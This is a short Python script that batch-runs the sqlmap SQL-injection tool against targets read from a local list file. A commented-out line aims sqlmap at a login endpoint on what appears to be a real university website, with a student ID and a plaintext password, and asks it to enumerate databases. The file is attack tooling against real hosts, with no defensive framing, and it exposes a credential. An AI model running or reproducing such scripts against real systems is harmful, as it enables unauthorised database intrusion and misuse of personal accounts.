import os

#os.system('sqlmap.py -u http://ssms.dongguk.edu/mbrmgt/DGU121 --data="loginType=student&loginId=2018113581&loginPwd=caps1234" --method=POST --dbs  --batch',)
print("asdfsadf")


with open("C:\dev\cmder\git\ICSP\sqlmap_list.txt") as f:
    for line in f:
        os.system("python C:\dev\cmder\git\ICSP\sqlmap\sqlmap.py "+ line+' --timeout=2')